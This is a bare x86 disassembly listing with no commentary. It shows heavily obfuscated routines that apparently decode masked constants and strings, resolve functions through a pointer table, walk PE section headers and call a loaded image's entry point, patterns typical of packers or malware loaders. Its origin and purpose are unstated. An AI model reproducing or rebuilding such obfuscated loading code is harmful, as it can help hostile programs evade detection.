  425ffe:	je     0x4262a7
  426004:	mov    eax,DWORD PTR [ebp+0xc]
  426007:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42600d:	mov    ecx,DWORD PTR [ecx]
  42600f:	xor    ecx,esi
  426011:	add    ecx,edi
  426013:	je     0x4261d2
  426019:	mov    eax,DWORD PTR [ebp-0x4]
  42601c:	xor    eax,esi
  42601e:	add    eax,edi
  426020:	and    DWORD PTR [ebp+0x8],0x0
  426024:	mov    DWORD PTR [ebp-0x14],eax
  426027:	mov    ecx,0xf89c8524
  42602c:	mov    eax,0xf89c85dc
  426031:	mov    DWORD PTR [ebp-0x58],0xf89c8526
  426038:	mov    DWORD PTR [ebp-0x54],0xf89c852c
  42603f:	mov    DWORD PTR [ebp-0x50],eax
  426042:	mov    DWORD PTR [ebp-0x4c],ecx
  426045:	mov    DWORD PTR [ebp-0x48],ecx
  426048:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  42604f:	mov    edx,DWORD PTR [ebp+0x8]
  426052:	mov    ecx,0x8a4
  426057:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  42605c:	mov    edx,0x72ec
  426061:	add    cx,dx
  426064:	mov    edx,DWORD PTR [ebp+0x8]
  426067:	inc    DWORD PTR [ebp+0x8]
  42606a:	cmp    DWORD PTR [ebp+0x8],0x6
  42606e:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426076:	jb     0x42604f
  426078:	mov    ecx,0xf89c8522
  42607d:	mov    DWORD PTR [ebp-0xb0],eax
  426083:	mov    DWORD PTR [ebp-0x9c],eax
  426089:	mov    DWORD PTR [ebp-0x74],eax
  42608c:	mov    DWORD PTR [ebp-0x70],eax
  42608f:	lea    eax,[ecx+0x1]
  426092:	mov    edx,0xf89c85fe
  426097:	mov    DWORD PTR [ebp-0x64],eax
  42609a:	mov    DWORD PTR [ebp-0x60],eax
  42609d:	mov    DWORD PTR [ebp-0xb4],0xf89c85c4
  4260a7:	mov    DWORD PTR [ebp-0xac],ecx
  4260ad:	mov    DWORD PTR [ebp-0xa8],edx
  4260b3:	mov    DWORD PTR [ebp-0xa4],0xf89c85d9
  4260bd:	mov    DWORD PTR [ebp-0xa0],0xf89c8526
  4260c7:	mov    DWORD PTR [ebp-0x98],0xf89c85fd
  4260d1:	mov    DWORD PTR [ebp-0x94],0xf89c8526
  4260db:	mov    DWORD PTR [ebp-0x90],0xf89c852c
  4260e5:	mov    DWORD PTR [ebp-0x8c],ecx
  4260eb:	mov    DWORD PTR [ebp-0x88],0xf89c8529
  4260f5:	mov    DWORD PTR [ebp-0x84],edx
  4260fb:	mov    DWORD PTR [ebp-0x80],0xf89c8527
  426102:	mov    DWORD PTR [ebp-0x7c],ecx
  426105:	mov    DWORD PTR [ebp-0x78],0xf89c85f1
  42610c:	mov    DWORD PTR [ebp-0x6c],ecx
  42610f:	mov    DWORD PTR [ebp-0x68],0xf89c85dd
  426116:	mov    DWORD PTR [ebp-0x5c],0xf89c85b0
  42611d:	xor    eax,eax
  42611f:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  426126:	xor    cl,0xa4
  426129:	sub    cl,0x14
  42612c:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  426133:	inc    eax
  426134:	cmp    eax,0x17
  426137:	jb     0x42611f
  426139:	mov    eax,DWORD PTR [ebx+0x1d8]
  42613f:	lea    ecx,[ebp-0xc0]
  426145:	push   ecx
  426146:	call   DWORD PTR [eax+0x4]
  426149:	mov    ecx,DWORD PTR [ebx+0x1d8]
  42614f:	lea    edx,[ebp-0xd8]
  426155:	push   edx
  426156:	push   eax
  426157:	call   DWORD PTR [ecx+0x8]
  42615a:	mov    DWORD PTR [ebp-0x40],eax
  42615d:	lea    eax,[ebp-0x14]
  426160:	push   eax
  426161:	mov    eax,DWORD PTR [ebx+0x18c]
  426167:	push   DWORD PTR [eax]
  426169:	mov    eax,DWORD PTR [ebp-0x40]
  42616c:	call   eax
  42616e:	mov    eax,DWORD PTR [ebp-0x4]
  426171:	xor    eax,esi
  426173:	add    eax,edi
  426175:	mov    DWORD PTR [ebp-0x34],eax
  426178:	mov    ecx,DWORD PTR [ebp-0x4]
  42617b:	mov    eax,DWORD PTR [ebp-0x14]
  42617e:	xor    ecx,esi
  426180:	add    ecx,edi
  426182:	cmp    eax,ecx
  426184:	je     0x4261cf
  426186:	mov    DWORD PTR [ebp-0x3c],eax
  426189:	jmp    0x42619a
  42618b:	mov    eax,DWORD PTR [eax]
  42618d:	mov    ecx,DWORD PTR [ebp-0x3c]
  426190:	mov    DWORD PTR [ebp-0x14],eax
  426193:	mov    eax,DWORD PTR [ebp-0x14]
  426196:	cmp    eax,ecx
  426198:	je     0x4261a7
  42619a:	mov    edx,DWORD PTR [eax+0x18]
  42619d:	mov    ecx,DWORD PTR [ebx+0x18c]
  4261a3:	cmp    edx,DWORD PTR [ecx]
  4261a5:	jne    0x42618b
  4261a7:	mov    ecx,DWORD PTR [ebx+0x18c]
  4261ad:	mov    edx,DWORD PTR [eax+0x18]
  4261b0:	cmp    edx,DWORD PTR [ecx]
  4261b2:	jne    0x4261cf
  4261b4:	mov    ecx,DWORD PTR [ebx+0x190]
  4261ba:	mov    edx,DWORD PTR [ebp-0x20]
  4261bd:	mov    edx,DWORD PTR [edx+0x28]
  4261c0:	add    edx,DWORD PTR [ecx]
  4261c2:	mov    DWORD PTR [eax+0x1c],edx
  4261c5:	mov    eax,DWORD PTR [ebp-0x24]
  4261c8:	xor    eax,esi
  4261ca:	add    eax,edi
  4261cc:	mov    DWORD PTR [ebp-0x34],eax
  4261cf:	mov    eax,DWORD PTR [ebp+0xc]
  4261d2:	push   ebx
  4261d3:	push   eax
  4261d4:	push   DWORD PTR [ebp+0x20]
  4261d7:	call   0x425953
  4261dc:	test   eax,eax
  4261de:	je     0x4262a7
  4261e4:	push   DWORD PTR [ebp+0xc]
  4261e7:	mov    ecx,ebx
  4261e9:	push   DWORD PTR [ebp+0x20]
  4261ec:	call   0x4258ac
  4261f1:	test   eax,eax
  4261f3:	je     0x4262a7
  4261f9:	mov    eax,DWORD PTR [ebp+0xc]
  4261fc:	mov    edx,DWORD PTR [ebp+0x20]
  4261ff:	mov    ecx,ebx
  426201:	call   0x425785
  426206:	test   eax,eax
  426208:	je     0x4262a7
  42620e:	push   ebx
  42620f:	push   DWORD PTR [ebp+0x20]
  426212:	call   0x425c36
  426217:	test   eax,eax
  426219:	je     0x4262a7
  42621f:	mov    eax,DWORD PTR [ebx+0x18c]
  426225:	mov    edx,DWORD PTR [ebp+0x20]
  426228:	cmp    edx,DWORD PTR [eax]
  42622a:	jne    0x426246
  42622c:	mov    eax,DWORD PTR [ebx+0x1d8]
  426232:	lea    ecx,[ebp-0x18]
  426235:	push   ecx
  426236:	push   DWORD PTR [ebp-0x18]
  426239:	mov    ecx,DWORD PTR [ebp-0x20]
  42623c:	push   DWORD PTR [ecx+0x54]
  42623f:	push   edx
  426240:	call   DWORD PTR [eax+0x1c]
  426243:	mov    edx,DWORD PTR [ebp+0x20]
  426246:	mov    eax,DWORD PTR [ebx+0x1c8]
  42624c:	mov    eax,DWORD PTR [eax]
  42624e:	xor    eax,esi
  426250:	add    eax,edi
  426252:	je     0x42628b
  426254:	mov    ecx,DWORD PTR [ebp+0xc]
  426257:	mov    eax,DWORD PTR [ecx+0x28]
  42625a:	mov    DWORD PTR [ebp+0x8],0xf89ca5b0
  426261:	mov    esi,DWORD PTR [ebp+0x8]
  426264:	push   DWORD PTR [ebp+0x14]
  426267:	xor    esi,0x8a4
  42626d:	push   DWORD PTR [ebp+0x10]
  426270:	add    esi,0x72ec
  426276:	or     WORD PTR [ecx+0x16],si
  42627a:	add    eax,edx
  42627c:	push   edx
  42627d:	call   eax
  42627f:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b1
  426289:	jmp    0x426295
  42628b:	mov    eax,DWORD PTR [ebp+0xc]
  42628e:	mov    eax,DWORD PTR [eax+0x28]
  426291:	add    eax,edx
  426293:	call   eax
  426295:	mov    DWORD PTR [ebp-0x8],eax
  426298:	mov    eax,DWORD PTR [ebp-0x8]
  42629b:	mov    ecx,DWORD PTR [ebp+0x1c]
  42629e:	mov    DWORD PTR [ecx],eax
  4262a0:	mov    DWORD PTR [ebp-0x30],0x1
  4262a7:	cmp    DWORD PTR [ebp-0x30],0x0
  4262ab:	jne    0x4262b1
  4262ad:	and    DWORD PTR [ebp+0x20],0x0
  4262b1:	mov    eax,DWORD PTR [ebp+0x20]
  4262b4:	jmp    0x4262b8
  4262b6:	xor    eax,eax
  4262b8:	pop    edi
  4262b9:	pop    esi
  4262ba:	pop    ebx
  4262bb:	leave  
  4262bc:	ret    0x1c
  4262bf:	push   ebp
  4262c0:	mov    ebp,esp
  4262c2:	movzx  edx,WORD PTR [ecx+0x6]
  4262c6:	movzx  eax,WORD PTR [ecx+0x14]
  4262ca:	push   ebx
  4262cb:	push   edi
  4262cc:	xor    edi,edi
  4262ce:	lea    eax,[eax+ecx*1+0x18]
  4262d2:	test   edx,edx
  4262d4:	je     0x4262f5
  4262d6:	mov    ecx,DWORD PTR [eax+0xc]
  4262d9:	lea    ebx,[ecx+esi*1]
  4262dc:	cmp    DWORD PTR [ebp+0x8],ebx
  4262df:	jb     0x4262ed
  4262e1:	mov    ebx,DWORD PTR [eax+0x8]
  4262e4:	add    ebx,ecx
  4262e6:	add    ebx,esi
  4262e8:	cmp    DWORD PTR [ebp+0x8],ebx
  4262eb:	jb     0x4262f7
  4262ed:	add    eax,0x28
  4262f0:	inc    edi
  4262f1:	cmp    edi,edx
  4262f3:	jb     0x4262d6
  4262f5:	xor    eax,eax
  4262f7:	pop    edi
  4262f8:	pop    ebx
  4262f9:	pop    ebp
  4262fa:	ret    0x4
  4262fd:	push   ebp
  4262fe:	mov    ebp,esp
  426300:	sub    esp,0x34
  426303:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  42630a:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  426311:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  426318:	mov    DWORD PTR [ebp-0x8],0xf89c85d1
  42631f:	mov    DWORD PTR [ebp-0x20],0xf89c85f1
  426326:	mov    DWORD PTR [ebp-0x2c],0xf89c852a
  42632d:	mov    DWORD PTR [ebp-0x2c],0xf89c85ca
  426334:	mov    DWORD PTR [ebp-0x10],eax
  426337:	mov    eax,DWORD PTR [ebp+0x8]
  42633a:	mov    DWORD PTR [ebp-0x14],eax
  42633d:	mov    eax,DWORD PTR [ebp-0xc]
  426340:	push   ebx
  426341:	mov    ecx,0x75108a4
  426346:	xor    eax,ecx
  426348:	push   esi
  426349:	mov    esi,DWORD PTR [ebp-0x10]
  42634c:	mov    edx,0x3272ec
  426351:	add    eax,edx
  426353:	push   edi
  426354:	cmp    esi,eax
  426356:	je     0x426535
  42635c:	mov    eax,DWORD PTR [ebp-0xc]
  42635f:	mov    esi,DWORD PTR [ebp-0x14]
  426362:	xor    eax,ecx
  426364:	add    eax,edx
  426366:	cmp    esi,eax
  426368:	je     0x426535
  42636e:	mov    eax,DWORD PTR [ebp-0xc]
  426371:	xor    eax,ecx
  426373:	add    eax,edx
  426375:	mov    DWORD PTR [ebp-0x24],eax
  426378:	mov    eax,DWORD PTR [ebp-0xc]
  42637b:	xor    eax,ecx
  42637d:	add    eax,edx
  42637f:	mov    DWORD PTR [ebp-0x28],eax
  426382:	mov    edi,DWORD PTR [ebp-0x20]
  426385:	mov    ebx,DWORD PTR [ebp-0x8]
  426388:	mov    esi,0x8a4
  42638d:	xor    edi,esi
  42638f:	mov    eax,0x72ec
  426394:	xor    ebx,esi
  426396:	add    edi,eax
  426398:	add    ebx,eax
  42639a:	sub    ebx,edi
  42639c:	mov    WORD PTR [ebp-0x8],bx
  4263a0:	jmp    0x426465
  4263a5:	mov    edi,DWORD PTR [ebp-0xc]
  4263a8:	mov    bx,WORD PTR [ebp-0x4]
  4263ac:	xor    edi,esi
  4263ae:	add    edi,eax
  4263b0:	cmp    bx,di
  4263b3:	je     0x4264a7
  4263b9:	mov    edi,DWORD PTR [ebp-0xc]
  4263bc:	mov    ebx,DWORD PTR [ebp+0xc]
  4263bf:	xor    edi,ecx
  4263c1:	add    edi,edx
  4263c3:	cmp    ebx,edi
  4263c5:	mov    di,WORD PTR [ebp-0x4]
  4263c9:	mov    bx,WORD PTR [ebp+0x8]
  4263cd:	je     0x426438
  4263cf:	cmp    bx,di
  4263d2:	je     0x426441
  4263d4:	mov    edi,DWORD PTR [ebp-0x20]
  4263d7:	mov    bx,WORD PTR [ebp+0x8]
  4263db:	xor    edi,esi
  4263dd:	add    edi,eax
  4263df:	cmp    bx,di
  4263e2:	jb     0x426402
  4263e4:	mov    edi,DWORD PTR [ebp-0x2c]
  4263e7:	mov    bx,WORD PTR [ebp+0x8]
  4263eb:	xor    edi,esi
  4263ed:	add    edi,eax
  4263ef:	cmp    bx,di
  4263f2:	ja     0x426402
  4263f4:	movzx  edi,WORD PTR [ebp+0x8]
  4263f8:	movzx  ebx,WORD PTR [ebp-0x8]
  4263fc:	add    edi,ebx
  4263fe:	mov    WORD PTR [ebp+0x8],di
  426402:	mov    edi,DWORD PTR [ebp-0x20]
  426405:	mov    bx,WORD PTR [ebp-0x4]
  426409:	xor    edi,esi
  42640b:	add    edi,eax
  42640d:	cmp    bx,di
  426410:	jb     0x426430
  426412:	mov    edi,DWORD PTR [ebp-0x2c]
  426415:	mov    bx,WORD PTR [ebp-0x4]
  426419:	xor    edi,esi
  42641b:	add    edi,eax
  42641d:	cmp    bx,di
  426420:	ja     0x426430
  426422:	movzx  edi,WORD PTR [ebp-0x4]
  426426:	movzx  ebx,WORD PTR [ebp-0x8]
  42642a:	add    edi,ebx
  42642c:	mov    WORD PTR [ebp-0x4],di
  426430:	mov    di,WORD PTR [ebp-0x4]
  426434:	mov    bx,WORD PTR [ebp+0x8]
  426438:	cmp    bx,di
  42643b:	jne    0x426535
  426441:	mov    edi,DWORD PTR [ebp-0x1c]
  426444:	mov    ebx,DWORD PTR [ebp-0x10]
  426447:	xor    edi,ecx
  426449:	lea    edi,[edi+ebx*1+0x3272ec]
  426450:	mov    DWORD PTR [ebp-0x10],edi
  426453:	mov    edi,DWORD PTR [ebp-0x1c]
  426456:	mov    ebx,DWORD PTR [ebp-0x14]
  426459:	xor    edi,ecx
  42645b:	lea    edi,[edi+ebx*1+0x3272ec]
  426462:	mov    DWORD PTR [ebp-0x14],edi
  426465:	mov    edi,DWORD PTR [ebp-0x24]
  426468:	mov    ebx,DWORD PTR [ebp-0x10]
  42646b:	mov    di,WORD PTR [ebx+edi*2]
  42646f:	mov    WORD PTR [ebp+0x8],di
  426473:	mov    edi,DWORD PTR [ebp-0x28]
  426476:	mov    ebx,DWORD PTR [ebp-0x14]
  426479:	mov    di,WORD PTR [ebx+edi*2]
  42647d:	mov    WORD PTR [ebp-0x4],di
  426481:	mov    edi,DWORD PTR [ebp-0xc]
  426484:	mov    bx,WORD PTR [ebp+0x8]
  426488:	xor    edi,esi
  42648a:	add    edi,eax
  42648c:	cmp    bx,di
  42648f:	jne    0x4263a5
  426495:	mov    eax,DWORD PTR [ebp-0x18]
  426498:	mov    esi,DWORD PTR [ebp-0xc]
  42649b:	xor    eax,ecx
  42649d:	add    eax,edx
  42649f:	imul   eax,esi
  4264a2:	mov    DWORD PTR [ebp-0xc],eax
  4264a5:	jmp    0x4264b9
  4264a7:	mov    eax,DWORD PTR [ebp-0xc]
  4264aa:	mov    esi,DWORD PTR [ebp-0x18]
  4264ad:	xor    eax,ecx
  4264af:	lea    eax,[eax+esi*1+0x3272ec]
  4264b6:	mov    DWORD PTR [ebp-0x18],eax
  4264b9:	mov    eax,DWORD PTR [ebp-0x24]
  4264bc:	sub    eax,edx
  4264be:	xor    eax,ecx
  4264c0:	mov    DWORD PTR [ebp-0x30],eax
  4264c3:	mov    eax,DWORD PTR [ebp-0x28]
  4264c6:	sub    eax,edx
  4264c8:	xor    eax,ecx
  4264ca:	mov    DWORD PTR [ebp-0x34],eax
  4264cd:	mov    eax,DWORD PTR [ebp-0x34]
  4264d0:	mov    esi,DWORD PTR [ebp-0x1c]
  4264d3:	xor    esi,ecx
  4264d5:	add    esi,edx
  4264d7:	xor    eax,ecx
  4264d9:	add    eax,0x3272ec
  4264de:	imul   esi,eax
  4264e1:	mov    eax,DWORD PTR [ebp-0x14]
  4264e4:	movzx  eax,WORD PTR [esi+eax*1]
  4264e8:	mov    esi,DWORD PTR [ebp-0x30]
  4264eb:	mov    edi,DWORD PTR [ebp-0x1c]
  4264ee:	xor    esi,ecx
  4264f0:	add    esi,edx
  4264f2:	xor    edi,ecx
  4264f4:	add    edi,edx
  4264f6:	imul   edi,esi
  4264f9:	mov    esi,DWORD PTR [ebp-0x10]
  4264fc:	movzx  esi,WORD PTR [edi+esi*1]
  426500:	sub    eax,edx
  426502:	sub    esi,edx
  426504:	xor    eax,ecx
  426506:	xor    esi,ecx
  426508:	cmp    esi,eax
  42650a:	jne    0x426535
  42650c:	mov    eax,DWORD PTR [ebp-0x30]
  42650f:	mov    esi,DWORD PTR [ebp-0x1c]
  426512:	xor    eax,ecx
  426514:	add    eax,0x3272ec
  426519:	xor    esi,ecx
  42651b:	add    esi,edx
  42651d:	imul   esi,eax
  426520:	mov    eax,DWORD PTR [ebp-0x10]
  426523:	movzx  eax,WORD PTR [esi+eax*1]
  426527:	mov    esi,DWORD PTR [ebp-0xc]
  42652a:	sub    eax,edx
  42652c:	xor    eax,ecx
  42652e:	cmp    eax,esi
  426530:	mov    eax,DWORD PTR [ebp-0xc]
  426533:	je     0x426538
  426535:	mov    eax,DWORD PTR [ebp-0x18]
  426538:	pop    edi
  426539:	xor    eax,ecx
  42653b:	pop    esi
  42653c:	add    eax,edx
  42653e:	pop    ebx
  42653f:	leave  
  426540:	ret    0x8
  426543:	push   ebp
  426544:	mov    ebp,esp
  426546:	push   ecx
  426547:	mov    cx,WORD PTR [eax]
  42654a:	push   esi
  42654b:	mov    esi,0x3b56
  426550:	sub    cx,si
  426553:	mov    esi,0x8a94
  426558:	xor    cx,si
  42655b:	mov    esi,0x4e3e
  426560:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  426567:	mov    edx,0xf89c85b0
  42656c:	cmp    cx,si
  42656f:	je     0x4265ce
  426571:	push   ebx
  426572:	push   edi
  426573:	movzx  ecx,cx
  426576:	mov    edi,0xffcd8d14
  42657b:	mov    esi,0x75108a4
  426580:	mov    ebx,0x4f92
  426585:	cmp    cx,bx
  426588:	jne    0x42658d
  42658a:	mov    DWORD PTR [ebp-0x4],edx
  42658d:	lea    edx,[edi+0x1]
  426590:	xor    edx,esi
  426592:	mov    edi,edx
  426594:	xor    edi,esi
  426596:	mov    cx,WORD PTR [eax+edi*2+0x64e5d8]
  42659e:	mov    ebx,0x3b56
  4265a3:	sub    cx,bx
  4265a6:	mov    ebx,0x8a94
  4265ab:	xor    cx,bx
  4265ae:	mov    ebx,0x4e3e
  4265b3:	cmp    cx,bx
  4265b6:	jne    0x426580
  4265b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4265bb:	pop    edi
  4265bc:	pop    ebx
  4265bd:	cmp    ecx,0xf89c85b7
  4265c3:	je     0x4265ce
  4265c5:	xor    ecx,esi
  4265c7:	lea    eax,[eax+ecx*2+0x64e5da]
  4265ce:	pop    esi
  4265cf:	leave  
  4265d0:	ret    
  4265d1:	push   ebp
  4265d2:	mov    ebp,esp
  4265d4:	push   ecx
  4265d5:	push   esi
  4265d6:	push   edi
  4265d7:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  4265de:	mov    esi,0xf89c85b0
  4265e3:	call   0x426543
  4265e8:	mov    edi,eax
  4265ea:	mov    al,BYTE PTR [edi]
  4265ec:	add    al,0x3
  4265ee:	xor    al,0x79
  4265f0:	cmp    al,0x7a
  4265f2:	je     0x426655
  4265f4:	mov    eax,edi
  4265f6:	mov    edx,0xffcd8d14
  4265fb:	mov    ecx,0x75108a4
  426600:	push   ebx
  426601:	mov    ax,WORD PTR [eax]
  426604:	mov    ebx,0x3b56
  426609:	sub    ax,bx
  42660c:	mov    ebx,0x8a94
  426611:	xor    ax,bx
  426614:	mov    ebx,0x4e4c
  426619:	cmp    ax,bx
  42661c:	jne    0x426621
  42661e:	mov    DWORD PTR [ebp-0x4],esi
  426621:	lea    esi,[edx+0x1]
  426624:	xor    esi,ecx
  426626:	mov    edx,esi
  426628:	xor    edx,ecx
  42662a:	lea    eax,[edi+edx*2+0x64e5d8]
  426631:	mov    bl,BYTE PTR [eax]
  426633:	add    bl,0x3
  426636:	xor    bl,0x79
  426639:	cmp    bl,0x7a
  42663c:	jne    0x426601
  42663e:	mov    eax,DWORD PTR [ebp-0x4]
  426641:	pop    ebx
  426642:	cmp    eax,0xf89c85b7
  426647:	je     0x426655
  426649:	xor    eax,ecx
  42664b:	xor    ecx,ecx
  42664d:	mov    WORD PTR [edi+eax*2+0x64e5d8],cx
  426655:	mov    eax,edi
  426657:	pop    edi
  426658:	pop    esi
  426659:	leave  
  42665a:	ret    
  42665b:	push   ebp
  42665c:	mov    ebp,esp
  42665e:	push   ecx
  42665f:	push   esi
  426660:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  426667:	mov    esi,0xf89c85b0
  42666c:	call   0x426543
  426671:	mov    cx,WORD PTR [eax]
  426674:	mov    edx,0x3b56
  426679:	sub    cx,dx
  42667c:	mov    edx,0x8a94
  426681:	xor    cx,dx
  426684:	mov    edx,0x4e3e
  426689:	cmp    cx,dx
  42668c:	je     0x4266e5
  42668e:	push   ebx
  42668f:	push   edi
  426690:	movzx  ecx,cx
  426693:	mov    edx,0xffcd8d14
  426698:	mov    edi,0x75108a4
  42669d:	mov    ebx,0x4e4c
  4266a2:	cmp    cx,bx
  4266a5:	jne    0x4266aa
  4266a7:	mov    DWORD PTR [ebp-0x4],esi
  4266aa:	lea    esi,[edx+0x1]
  4266ad:	xor    esi,edi
  4266af:	mov    edx,esi
  4266b1:	xor    edx,edi
  4266b3:	mov    cx,WORD PTR [eax+edx*2+0x64e5d8]
  4266bb:	mov    ebx,0x3b56
  4266c0:	sub    cx,bx
  4266c3:	mov    ebx,0x8a94
  4266c8:	xor    cx,bx
  4266cb:	mov    ebx,0x4e3e
  4266d0:	cmp    cx,bx
  4266d3:	jne    0x42669d
  4266d5:	cmp    DWORD PTR [ebp-0x4],0xf89c85b7
  4266dc:	pop    edi
  4266dd:	pop    ebx
  4266de:	je     0x4266e5
  4266e0:	xor    eax,eax
  4266e2:	inc    eax
  4266e3:	jmp    0x4266e7
  4266e5:	xor    eax,eax
  4266e7:	pop    esi
  4266e8:	leave  
  4266e9:	ret    
  4266ea:	push   ebp
  4266eb:	mov    ebp,esp
  4266ed:	push   ecx
  4266ee:	mov    eax,DWORD PTR [ebp+0x8]
  4266f1:	movzx  ecx,WORD PTR [eax]
  4266f4:	push   esi
  4266f5:	lea    eax,[ecx-0x3b56]
  4266fb:	mov    esi,0x8a94
  426700:	push   edi
  426701:	xor    eax,esi
  426703:	mov    edi,0x4e3e
  426708:	mov    DWORD PTR [ebp-0x4],edx
  42670b:	cmp    ax,di
  42670e:	je     0x42673b
  426710:	mov    eax,DWORD PTR [ebp+0x8]
  426713:	sub    eax,edx
  426715:	mov    DWORD PTR [ebp+0x8],eax
  426718:	jmp    0x42671d
  42671a:	mov    eax,DWORD PTR [ebp+0x8]
  42671d:	mov    WORD PTR [edx],cx
  426720:	add    edx,0x2
  426723:	movzx  edi,WORD PTR [eax+edx*1]
  426727:	mov    ecx,edi
  426729:	add    edi,0xffffc4aa
  42672f:	xor    edi,esi
  426731:	mov    eax,0x4e3e
  426736:	cmp    di,ax
  426739:	jne    0x42671a
  42673b:	xor    eax,eax
  42673d:	pop    edi
  42673e:	mov    WORD PTR [edx],ax
  426741:	mov    eax,DWORD PTR [ebp-0x4]
  426744:	pop    esi
  426745:	leave  
  426746:	ret    0x4
  426749:	push   ebp
  42674a:	mov    ebp,esp
  42674c:	sub    esp,0x18
  42674f:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  426756:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  42675d:	mov    ecx,DWORD PTR [ebp-0x8]
  426760:	push   esi
  426761:	mov    eax,0x75108a4
  426766:	xor    ecx,eax
  426768:	mov    esi,0x3272ec
  42676d:	add    ecx,esi
  42676f:	mov    DWORD PTR [ebp-0x4],ecx
  426772:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  426779:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  426780:	push   edi
  426781:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  426788:	jmp    0x426829
  42678d:	mov    ecx,DWORD PTR [ebp-0x4]
  426790:	mov    edx,DWORD PTR [ebp+0x10]
  426793:	sub    edx,ecx
  426795:	mov    ecx,DWORD PTR [ebp-0xc]
  426798:	xor    ecx,eax
  42679a:	add    ecx,esi
  42679c:	cmp    edx,ecx
  42679e:	jbe    0x4267bb
  4267a0:	mov    edx,DWORD PTR [ebp-0x4]
  4267a3:	add    edx,DWORD PTR [ebp+0x8]
  4267a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4267a9:	add    ecx,DWORD PTR [ebp+0xc]
  4267ac:	mov    edi,DWORD PTR [ecx]
  4267ae:	mov    DWORD PTR [edx],edi
  4267b0:	mov    ecx,DWORD PTR [ecx+0x4]
  4267b3:	mov    DWORD PTR [edx+0x4],ecx
  4267b6:	mov    ecx,DWORD PTR [ebp-0xc]
  4267b9:	jmp    0x426808
  4267bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4267be:	mov    edx,DWORD PTR [ebp+0x10]
  4267c1:	sub    edx,ecx
  4267c3:	mov    ecx,DWORD PTR [ebp-0x10]
  4267c6:	xor    ecx,eax
  4267c8:	add    ecx,esi
  4267ca:	cmp    edx,ecx
  4267cc:	mov    ecx,DWORD PTR [ebp-0x4]
  4267cf:	jbe    0x4267e3
  4267d1:	add    ecx,DWORD PTR [ebp+0x8]
  4267d4:	mov    edx,DWORD PTR [ebp-0x4]
  4267d7:	add    edx,DWORD PTR [ebp+0xc]
  4267da:	mov    edx,DWORD PTR [edx]
  4267dc:	mov    DWORD PTR [ecx],edx
  4267de:	mov    ecx,DWORD PTR [ebp-0x10]
  4267e1:	jmp    0x426808
  4267e3:	mov    edx,DWORD PTR [ebp+0x10]
  4267e6:	sub    edx,ecx
  4267e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4267eb:	xor    ecx,eax
  4267ed:	add    ecx,esi
  4267ef:	cmp    edx,ecx
  4267f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4267f4:	jbe    0x426819
  4267f6:	add    ecx,DWORD PTR [ebp+0x8]
  4267f9:	mov    edx,DWORD PTR [ebp-0x4]
  4267fc:	add    edx,DWORD PTR [ebp+0xc]
  4267ff:	mov    dx,WORD PTR [edx]
  426802:	mov    WORD PTR [ecx],dx
  426805:	mov    ecx,DWORD PTR [ebp-0x14]
  426808:	mov    edx,DWORD PTR [ebp-0x4]
  42680b:	xor    ecx,eax
  42680d:	lea    ecx,[ecx+edx*1+0x3272ec]
  426814:	mov    DWORD PTR [ebp-0x4],ecx
  426817:	jmp    0x426829
  426819:	add    ecx,DWORD PTR [ebp+0x8]
  42681c:	mov    edx,DWORD PTR [ebp-0x4]
  42681f:	add    edx,DWORD PTR [ebp+0xc]
  426822:	mov    dl,BYTE PTR [edx]
  426824:	mov    BYTE PTR [ecx],dl
  426826:	inc    DWORD PTR [ebp-0x4]
  426829:	mov    ecx,DWORD PTR [ebp-0x18]
  42682c:	mov    edx,DWORD PTR [ebp+0x10]
  42682f:	xor    ecx,eax
  426831:	add    ecx,esi
  426833:	imul   ecx,edx
  426836:	mov    edx,DWORD PTR [ebp-0x8]
  426839:	mov    edi,DWORD PTR [ebp-0x4]
  42683c:	xor    edx,eax
  42683e:	lea    edx,[edx+edi*1+0x3272ec]
  426845:	cmp    edx,ecx
  426847:	jb     0x42678d
  42684d:	pop    edi
  42684e:	pop    esi
  42684f:	leave  
  426850:	ret    0xc
  426853:	push   ebp
  426854:	mov    ebp,esp
  426856:	sub    esp,0xc
  426859:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426860:	push   esi
  426861:	mov    esi,eax
  426863:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  42686a:	mov    edx,DWORD PTR [ebp-0x4]
  42686d:	mov    eax,0x75108a4
  426872:	xor    edx,eax
  426874:	mov    ecx,0x3272ec
  426879:	add    edx,ecx
  42687b:	cmp    esi,edx
  42687d:	je     0x4268bf
  42687f:	push   ebx
  426880:	push   edi
  426881:	mov    edx,DWORD PTR [ebp-0x8]
  426884:	mov    ebx,DWORD PTR [ebp+0x8]
  426887:	xor    edx,eax
  426889:	mov    edi,0xffcd8d14
  42688e:	sub    edi,edx
  426890:	add    esi,edi
  426892:	lea    edx,[esi-0x3272ec]
  426898:	xor    edx,eax
  42689a:	mov    DWORD PTR [ebp-0xc],edx
  42689d:	mov    edx,DWORD PTR [ebp-0x4]
  4268a0:	mov    edi,DWORD PTR [ebp-0xc]
  4268a3:	xor    dl,0xa4
  4268a6:	sub    dl,0x14
  4268a9:	xor    edi,eax
  4268ab:	mov    BYTE PTR [edi+ebx*1+0x3272ec],dl
  4268b2:	mov    edx,DWORD PTR [ebp-0x4]
  4268b5:	xor    edx,eax
  4268b7:	add    edx,ecx
  4268b9:	cmp    esi,edx
  4268bb:	jne    0x426881
  4268bd:	pop    edi
  4268be:	pop    ebx
  4268bf:	pop    esi
  4268c0:	leave  
  4268c1:	ret    0x4
  4268c4:	push   ebp
  4268c5:	mov    ebp,esp
